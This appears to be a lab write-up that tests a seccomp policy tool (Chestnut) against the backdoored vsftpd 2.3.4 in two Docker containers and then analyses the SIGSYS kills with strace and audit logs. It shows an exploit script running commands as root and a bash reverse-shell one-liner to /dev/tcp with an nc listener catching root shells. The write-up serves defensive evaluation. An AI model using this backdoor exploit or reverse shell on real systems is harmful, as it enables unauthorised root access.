## vsftpd – chestnut

### Preparation

For the seccomp container we follow these steps, to create a policy for the `vsftpd` binary and apply it:

1. Enter the seccomp container:
   `docker exec -it vsftpd-chestnut-seccomp-container "bash`

2. Run following commands inside the container. After executing `rewrite.sh` the binary will get executed:

```
mkdir /tool/Chestnut/Binalyzer/cached_results/
sed -i 's/from cfg import cached_results_folder/cached_results_folder = "cached_results"/' /tool/Chestnut/Binalyzer/syscalls.py
cd /tool/Chestnut/Binalyzer
python3 /tool/Chestnut/Binalyzer/syscalls.py /app/vsftpd-2.3.4-infected/vsftpd
python3 /tool/Chestnut/Binalyzer/policy.py /app/vsftpd-2.3.4-infected/vsftpd
cp /tool/Chestnut/Binalyzer/cached_results/policy__app_vsftpd-2.3.4-infected_vsftpd.json /tool/Chestnut/ChestnutPatcher/
cd /tool/Chestnut/ChestnutPatcher && make
/tool/Chestnut/ChestnutPatcher/rewrite.sh /app/vsftpd-2.3.4-infected/vsftpd /app/vsftpd-2.3.4-infected/vsftpd.conf
```

For the container without seccomp, we just have to start it with following command:
`docker exec -it vsftpd-chestnut-normal-container /app/vsftpd-2.3.4-infected/vsftpd /app/vsftpd-2.3.4-infected/vsftpd.conf`

### Conduct the exploits

First, we verify the IP addresses of the container, to ensure we target the right containers:

```
❯ docker ps
CONTAINER ID   IMAGE                      COMMAND       CREATED             STATUS             PORTS                                                                                  NAMES
4f16987c58e0   vsftpd-chestnut-seccomp    "/bin/bash"   10 minutes ago      Up 10 minutes      0.0.0.0:2104->21/tcp, [::]:2104->21/tcp, 0.0.0.0:6204->6200/tcp, [::]:6204->6200/tcp   vsftpd-chestnut-seccomp-container
66fa1ece7f08   vsftpd-chestnut-normal     "/bin/bash"   10 minutes ago      Up 10 minutes      0.0.0.0:2103->21/tcp, [::]:2103->21/tcp, 0.0.0.0:6203->6200/tcp, [::]:6203->6200/tcp   vsftpd-chestnut-normal-container

❯ docker inspect vsftpd-chestnut-seccomp-container | grep '"IPAddress":'
                    "IPAddress": "192.168.224.2",
❯ docker inspect vsftpd-chestnut-normal-container | grep '"IPAddress":'
                    "IPAddress": "192.168.224.3",
```

_Seccomp_:
The attack on the container with the applied seccomp profile on the binary fails partially.

```
❯ ./attackSubject.sh 192.168.224.2 whoami
[+] worked: root
❯ ./attackSubject.sh 192.168.224.2 id
[+] worked: Bad system call (core dumped)
❯ ./attackSubject.sh 192.168.224.2 ls
[+] worked: Bad system call (core dumped)
❯ ./attackSubject.sh 192.168.224.2 pwd
[+] worked: /tool/Chestnut/ChestnutPatcher
❯ ./attackSubject.sh 192.168.224.2 "bash -c 'bash -i >& /dev/tcp/192.168.224.1/4444 0>&1'"
[-] no response!

❯ nc -lvnp 4444 # note, this is on another terminal
Connection from 192.168.224.2:47994
bash: cannot set terminal process group (203): Inappropriate ioctl for device
bash: no job control in this shell
root@4f16987c58e0:/tool/Chestnut/ChestnutPatcher# id
id
bash: [206: 5 (255)] tcsetattr: Inappropriate ioctl for device
```

_Normal_
The attack on the container without the seccomp profile succeeds. We are able to run arbitrary commands:

```
❯ ./attackSubject.sh 192.168.224.3 "id"
[+] worked: uid=0(root) gid=0(root) groups=0(root)
❯ ./attackSubject.sh 192.168.224.3 "pwd"
[+] worked: /app/vsftpd-2.3.4-infected
❯ ./attackSubject.sh 192.168.224.3 "ls"
[+] worked: AUDIT
BENCHMARKS
❯ ./attackSubject.sh 192.168.224.3 "whoami"
[+] worked: root
❯ ./attackSubject.sh 192.168.224.3 "bash -c 'bash -i >& /dev/tcp/192.168.224.1/4444 0>&1'"
[-] no response!

❯ nc -lvnp 4444 # note, this is on another terminal
Connection from 192.168.224.3:37400
bash: cannot set terminal process group (33): Inappropriate ioctl for device
bash: no job control in this shell
root@66fa1ece7f08:/app/vsftpd-2.3.4-infected# id
id
uid=0(root) gid=0(root) groups=0(root)
```

### Analysis

As the exploit worked on the container without the seccomp profile, only the one with the enforced profile will be analysed.

_strace output:_
When starting the container with the command `strace -f /tool/Chestnut/ChestnutPatcher/rewrite.sh /app/vsftpd-2.3.4-infected/vsftpd /app/vsftpd-2.3.4-infected/vsftpd.conf` we are able to see that just before the process with the pid `299` was killed with the signal `SIGSYS`, the system call `set_tid_address` was executed. The same happend to pid `302`.

```
# id command
[pid   299] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x76a21d4e9000
[pid   299] arch_prctl(ARCH_SET_FS, 0x76a21d4ea040) = 0
[pid   299] mprotect(0x76a21d09d000, 16384, PROT_READ) = 0
[pid   299] mprotect(0x76a21c83b000, 4096, PROT_READ) = 0
[pid   299] mprotect(0x76a21ca43000, 4096, PROT_READ) = 0
[pid   299] mprotect(0x76a21ccb4000, 4096, PROT_READ) = 0
[pid   299] mprotect(0x76a21d2cb000, 4096, PROT_READ) = 0
[pid   299] mprotect(0x5a4486609000, 4096, PROT_READ) = 0
[pid   299] mprotect(0x76a21d4f8000, 4096, PROT_READ) = 0
[pid   299] munmap(0x76a21d4ed000, 18313) = 0
[pid   299] set_tid_address(0x76a21d4ea310) = 218
[pid   299] +++ killed by SIGSYS (core dumped) +++

# ls command
[pid   302] arch_prctl(ARCH_SET_FS, 0x70d125044040) = 0
[pid   302] mprotect(0x70d124bf7000, 16384, PROT_READ) = 0
[pid   302] mprotect(0x70d124395000, 4096, PROT_READ) = 0
[pid   302] mprotect(0x70d12459d000, 4096, PROT_READ) = 0
[pid   302] mprotect(0x70d12480e000, 4096, PROT_READ) = 0
[pid   302] mprotect(0x70d124e25000, 4096, PROT_READ) = 0
[pid   302] mprotect(0x63f49101e000, 8192, PROT_READ) = 0
[pid   302] mprotect(0x70d125052000, 4096, PROT_READ) = 0
[pid   302] munmap(0x70d125047000, 18313) = 0
[pid   302] set_tid_address(0x70d125044310) = 218
[pid   302] +++ killed by SIGSYS (core dumped) +++

```

Further analysis on the host machine with the tool `ausearch` delievers us more insights.
As we can see, the syscall with the number 218 was the reason for the `SIGSYS` signal.

```
time->Thu Apr  3 13:37:59 2025
type=SECCOMP msg=audit(1743680279.825:24481): auid=4294967295 uid=0 gid=0 ses=4294967295 pid=112448 comm="id" exe="/usr/bin/id" sig=31 arch=c000003e syscall=218 compat=0 ip=0x733cd6c60eb5 code=0x0
----
time->Thu Apr  3 13:38:01 2025
type=SECCOMP msg=audit(1743680281.316:24491): auid=4294967295 uid=0 gid=0 ses=4294967295 pid=112479 comm="ls" exe="/bin/ls" sig=31 arch=c000003e syscall=218 compat=0 ip=0x7bdb5659ceb5 code=0x0
```

We verify that the system call number `218` maps to `set_tid_address` with the `ausyscall` tool:

```
❯ ausyscall --dump | grep 218
218	set_tid_address
```

The last thing we check is, if the system call number `218` was in the applied seccomp profile. The file `policy__app_vsftpd-2.3.4-infected_vsftpd.json` shows no presence:

```
{"version": 1, "syscalls": [0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 201, 202, 203, 204, 213, 216, 220, 221, 227, 228, 229, 230, 231, 232, 233, 234, 235, 247, 253, 254, 255, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 275, 276, 277, 278, 280, 281, 283, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 318, 319, 322, 325, 326, 327, 328, 329, 330, 331]}
```
